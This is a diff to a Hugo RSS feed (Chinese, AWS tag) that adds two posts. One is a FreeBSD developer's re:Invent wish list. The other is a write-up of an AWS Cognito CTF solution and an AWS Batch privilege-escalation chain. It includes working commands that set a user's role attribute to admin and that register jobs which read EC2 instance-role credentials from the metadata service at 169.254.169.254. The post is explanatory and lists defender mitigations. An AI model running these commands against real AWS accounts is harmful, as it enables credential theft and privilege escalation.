@@ -7,7 +7,152 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>qife</copyright>
-        <lastBuildDate>Sat, 02 Aug 2025 22:00:53 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/aws/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Sun, 03 Aug 2025 08:00:39 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/aws/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>我在re:Invent大会上的技术诉求：从跨AZ带宽定价到CHERI实例</title>
+        <link>http://localhost:1313/p/%E6%88%91%E5%9C%A8reinvent%E5%A4%A7%E4%BC%9A%E4%B8%8A%E7%9A%84%E6%8A%80%E6%9C%AF%E8%AF%89%E6%B1%82%E4%BB%8E%E8%B7%A8az%E5%B8%A6%E5%AE%BD%E5%AE%9A%E4%BB%B7%E5%88%B0cheri%E5%AE%9E%E4%BE%8B/</link>
+        <pubDate>Sun, 03 Aug 2025 08:00:39 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/%E6%88%91%E5%9C%A8reinvent%E5%A4%A7%E4%BC%9A%E4%B8%8A%E7%9A%84%E6%8A%80%E6%9C%AF%E8%AF%89%E6%B1%82%E4%BB%8E%E8%B7%A8az%E5%B8%A6%E5%AE%BD%E5%AE%9A%E4%BB%B7%E5%88%B0cheri%E5%AE%9E%E4%BE%8B/</guid>
+        <description>&lt;p&gt;作为AWS Hero，我获得了免费参加AWS re:Invent大会的机会。虽然我很少对多数演讲感兴趣——往年我参加过一些&amp;quot;高级&amp;quot;讲座，但内容都未超出已发布的文档范围——但我发现这是与亚马逊员工交流的绝佳机会。&lt;/p&gt;
+&lt;p&gt;今年我有一长串诉求清单，考虑到可能引起亚马逊员工（甚至非亚马逊人士）的兴趣，我决定在此公开分享：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;增加re:Invent大会上的亚马逊开源开发者数量&lt;/strong&gt;&lt;br&gt;
+我期待周三与Valkey开发者会面，但对Firecracker开发者无人参会感到失望。亚马逊有不派工程师参会除非他们演讲的政策（我希望能改变这一政策），但对开源开发者而言，参会结识潜在贡献者至关重要。如果你的开源团队不参加会议，无论代码采用什么许可证，都不算真正在做开源。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;降低跨可用区(AZ)带宽定价&lt;/strong&gt;&lt;br&gt;
+我甚至不太在意成本本身，但人们对跨AZ带宽的担忧导致他们设计出糟糕的系统架构。亚马逊&amp;quot;良好架构框架&amp;quot;中的一条准则是将工作负载部署到多个位置，并明确指出使用单一可用区是个问题——但对跨AZ带宽的担忧（即使最终证明是多余的）阻碍了人们遵循这一准则。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;机架级EBS存储&lt;/strong&gt;&lt;br&gt;
+当前&amp;quot;SSD&amp;quot;EBS卷的I/O延迟表明它们与访问的EC2实例相距甚远。而某些EC2实例类型直接附加SSD，I/O性能显著提升——但耐久性低（实例终止数据即丢失）且缺乏弹性。将EBS存储部署在与EC2节点相同的机架上，可提供介于两者之间的解决方案，实现比跨数据中心更低的延迟，同时保持卷大小的灵活性。用户需接受&amp;quot;在此实例同机架创建卷&amp;quot;可能返回&amp;quot;该机架磁盘已满&amp;quot;的情况，但至少在实例启动时可以寻找有足够本地磁盘的机架。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;支持CHERI的安全实例&lt;/strong&gt;&lt;br&gt;
+这是我长期以来的愿望清单项目。CHERI在安全性方面具有巨大优势，哪家云厂商率先实现将遥遥领先竞争对手。我知道亚马逊（和其他云厂商）拥有用于研究的Morello开发板。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Marketplace支持&amp;quot;待发布&amp;quot;版本&lt;/strong&gt;&lt;br&gt;
+当我在AWS Marketplace添加新的FreeBSD版本时，需经过审批流程并复制到所有EC2区域，然后Marketplace更新产品列表并发送新版本邮件通知。这常导致亚马逊发送新FreeBSD版本邮件比我官方发布公告还早几天。我希望能够预先告知Marketplace即将发布的FreeBSD版本，让他们准备就绪但暂不更新网站或发送邮件，直到我准备好官方公告（通常会给镜像和云服务几天同步时间）。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;此外，我还向Zoom提出改进建议：当从FreeBSD笔记本电脑加入会议时，Zoom网站应能通过用户代理字符串识别没有客户端，直接提供在浏览器中开会的选项，而不是反复尝试打开客户端。Zoom团队立即理解问题，甚至考虑将Linux客户端移植到FreeBSD。&lt;/p&gt;
+&lt;p&gt;关于透明度说明：除了提供免费参会和差旅，亚马逊还赞助我的FreeBSD工作。他们资助的内容约一半是EC2相关，另一半是FreeBSD发布工程。没有他们的支持，许多重要功能将无法出现在FreeBSD 14.2-RELEASE中。感谢亚马逊。&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>探索AWS Batch权限提升漏洞的技术分析</title>
+        <link>http://localhost:1313/p/%E6%8E%A2%E7%B4%A2aws-batch%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</link>
+        <pubDate>Sun, 03 Aug 2025 01:56:38 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/%E6%8E%A2%E7%B4%A2aws-batch%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</guid>
+        <description>&lt;h3 id=&#34;从上一期说起您解决cloudsectidbit第2期的iac实验了吗&#34;&gt;从上一期说起&amp;hellip;您解决CloudSecTidbit第2期的IaC实验了吗？
+&lt;/h3&gt;&lt;p&gt;[解决方案]
+AWS Cognito挑战的核心是通过权限提升获取管理员权限并读取内部用户列表。应用程序使用AWS Cognito颁发的会话令牌（保存为名为&lt;code&gt;aws-cognito-app-access-token&lt;/code&gt;的cookie），攻击者可以通过以下步骤实现提权：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;aws cognito-idp get-user --region us-east-1 --access-token &amp;lt;USER_ACCESS_TOKEN&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;aws --region us-east-1 cognito-idp update-user-attributes --user-attributes &lt;span class=&#34;s2&#34;&gt;&amp;#34;Name=custom:Role,Value=admin&amp;#34;&lt;/span&gt; --access-token &amp;lt;USER_ACCESS_TOKEN&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;漏洞根源在于平台过度信任&lt;code&gt;custom:Role&lt;/code&gt;属性进行授权判断。&lt;/p&gt;
+&lt;h3 id=&#34;技术聚焦aws-batch权限提升研究&#34;&gt;技术聚焦：AWS Batch权限提升研究
+&lt;/h3&gt;&lt;h4 id=&#34;aws-batch基础架构&#34;&gt;AWS Batch基础架构
+&lt;/h4&gt;&lt;p&gt;AWS Batch是AWS提供的批处理计算服务，主要组件包括：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Jobs&lt;/strong&gt;：工作单元（脚本/可执行文件/容器镜像）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Job definitions&lt;/strong&gt;：任务蓝图（含IAM角色、资源需求等配置）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Job Queues&lt;/strong&gt;：任务调度队列&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Compute environments&lt;/strong&gt;：计算资源环境（支持Fargate/EC2/EKS三种编排类型）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;漏洞场景分析&#34;&gt;漏洞场景分析
+&lt;/h4&gt;&lt;p&gt;在多租户平台中发现高危配置：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;所有租户任务均使用EC2编排类型运行&lt;/li&gt;
+&lt;li&gt;计算环境EC2实例需要高权限角色管理EFS等资源&lt;/li&gt;
+&lt;li&gt;任务容器具有&lt;code&gt;batch:RegisterJobDefinition&lt;/code&gt;和&lt;code&gt;batch:SubmitJob&lt;/code&gt;权限&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id=&#34;攻击链分解&#34;&gt;攻击链分解
+&lt;/h4&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;初始访问&lt;/strong&gt;：通过容器元数据服务（CMDS@169.254.170.2）获取任务执行角色凭证&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;权限滥用&lt;/strong&gt;：利用获得的凭证创建恶意任务定义&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;网络配置突破&lt;/strong&gt;：由于EC2环境默认使用主机网络模式，容器可访问实例元数据服务（IMDSv2）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;凭证窃取&lt;/strong&gt;：通过IMDS获取EC2实例的高权限角色凭证&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id=&#34;技术验证过程&#34;&gt;技术验证过程
+&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;步骤1 - 获取实例角色名&lt;/strong&gt;：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;aws batch register-job-definition &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --job-definition-name poc-get-rolename &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --type container &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --container-properties &lt;span class=&#34;s1&#34;&gt;&amp;#39;{
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;    &amp;#34;image&amp;#34;: &amp;#34;curlimages/curl&amp;#34;,
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;    &amp;#34;command&amp;#34;: [&amp;#34;sh&amp;#34;,&amp;#34;-c&amp;#34;,&amp;#34;TOKEN=`curl -X PUT http://169.254.169.254/latest/api/token -H X-aws-ec2-metadata-token-ttl-seconds:21600`; curl -H X-aws-ec2-metadata-token:$TOKEN http://169.254.169.254/latest/meta-data/iam/security-credentials/&amp;#34;]
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;  }&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;strong&gt;步骤2 - 获取角色凭证&lt;/strong&gt;：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;aws batch register-job-definition &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --job-definition-name poc-get-aimcreds &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --type container &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --container-properties &lt;span class=&#34;s1&#34;&gt;&amp;#39;{
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;    &amp;#34;image&amp;#34;: &amp;#34;curlimages/curl&amp;#34;,
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;    &amp;#34;command&amp;#34;: [&amp;#34;sh&amp;#34;,&amp;#34;-c&amp;#34;,&amp;#34;TOKEN=`curl -X PUT http://169.254.169.254/latest/api/token -H X-aws-ec2-metadata-token-ttl-seconds:21600`; curl -H X-aws-ec2-metadata-token:$TOKEN http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME&amp;#34;]
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;  }&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h4 id=&#34;安全建议&#34;&gt;安全建议
+&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;审计人员检查清单&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;确认任务执行上下文是否限制IMDS访问&lt;/li&gt;
+&lt;li&gt;审查EC2编排环境中的实例角色权限&lt;/li&gt;
+&lt;li&gt;检查是否过度分配&lt;code&gt;RegisterJobDefinition/SubmitJob&lt;/code&gt;权限&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;开发者防护措施&lt;/strong&gt;：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;网络层限制IMDS访问（通过&lt;code&gt;aws ec2 modify-instance-metadata-options&lt;/code&gt;）&lt;/li&gt;
+&lt;li&gt;遵循最小权限原则配置任务角色&lt;/li&gt;
+&lt;li&gt;考虑使用Fargate替代EC2编排类型&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;实践资源&#34;&gt;实践资源
+&lt;/h3&gt;&lt;p&gt;漏洞复现环境已开源：&lt;a class=&#34;link&#34; href=&#34;https://github.com/doyensec/cloudsec-tidbits/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;CloudSecTidbits实验室&lt;/a&gt;&lt;/p&gt;
+&lt;h4 id=&#34;延伸阅读&#34;&gt;延伸阅读
+&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://docs.aws.amazon.com/batch/latest/userguide/what-is-batch.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;AWS Batch官方文档&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.doyensec.com/2023/03/13/aws-metadata-service-container-security.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;容器工作负载中的元数据服务安全&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        </item>
+        <item>
         <title>AWS远程访问指南：混合办公环境的安全技术方案</title>
         <link>http://localhost:1313/p/aws%E8%BF%9C%E7%A8%8B%E8%AE%BF%E9%97%AE%E6%8C%87%E5%8D%97%E6%B7%B7%E5%90%88%E5%8A%9E%E5%85%AC%E7%8E%AF%E5%A2%83%E7%9A%84%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88/</link>
         <pubDate>Sat, 02 Aug 2025 22:00:53 +0800</pubDate>
